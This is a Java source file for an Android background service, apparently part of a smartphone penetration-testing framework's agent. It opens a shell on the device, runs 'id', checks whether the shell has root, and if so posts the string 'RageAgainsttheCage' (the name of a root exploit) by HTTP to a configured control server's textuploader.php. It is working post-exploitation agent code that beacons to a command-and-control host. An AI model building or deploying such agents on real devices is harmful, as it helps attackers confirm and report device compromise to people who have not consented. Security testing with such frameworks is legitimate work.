package com.bulbsecurity.framework;

import jackpal.androidterm.Exec;
import android.util.Log;
import org.apache.http.NameValuePair;

import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;


import android.app.Service;
import android.content.Context;
import android.content.Intent;

import android.os.IBinder;

public class Phase2 extends Service {
	

	
	@Override
	public void onCreate() {
		
		
	}
	
	@Override
	public void onStart(Intent intent, int startID)  {
		
		

		final int[] processId = new int[1];
		final FileDescriptor fd2 = Exec.createSubprocess("/system/bin/sh", "-", null, processId);


		final FileOutputStream out = new FileOutputStream(fd2);
		final FileInputStream in = new FileInputStream(fd2);


		new Thread() {
			public void run() {
				byte[] mBuffer = new byte[4096];
				int read = 0;
				while (read >= 0) {
					try {
						read = in.read(mBuffer);
						String str = new String(mBuffer, 0, read);
						 if (str.contains("uid="))
						 {
						if (str.contains("root")) {
							//Intent intent3 = new Intent(getApplicationContext(),WebUploadService.class);
							//intent3.putExtra("uploadstring", "RageAgainstTheCage");
							//Context context = getApplicationContext();
							//context.startService(intent3);
								Log.i("AAAA","uploading");
			
			ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
			nameValuePairs.add(new BasicNameValuePair("text", "RageAgainsttheCage"));
		
				HttpClient httpclient = new DefaultHttpClient();
				String http = "http://";
				//String controlIP = ((AndroidAgent) this.getApplication()).getcontrolIP();
				//String path = ((AndroidAgent) this.getApplication()).getpath();
				String controlIP = getApplicationContext().getResources().getString(R.string.controlIP);
				String path = getApplicationContext().getResources().getString(R.string.controlpath);
				String url = "/textuploader.php";
				String uri = http.concat(controlIP);
				String postto1 = uri.concat(path);
				String postto = postto1.concat(url);
				HttpPost httppost = new HttpPost(postto);
				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				httpclient.execute(httppost);
						
						} }
					} catch (Exception ex) {		
					}
				}
				
			}
		}.start();

		try {
			write(out, "id");
			
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}


public void write(FileOutputStream out, String command) throws IOException {
	command += "\n";
	out.write(command.getBytes());
	out.flush();
}

@Override
public IBinder onBind(Intent intent) {
	// TODO Auto-generated method stub
	return null;
}
}

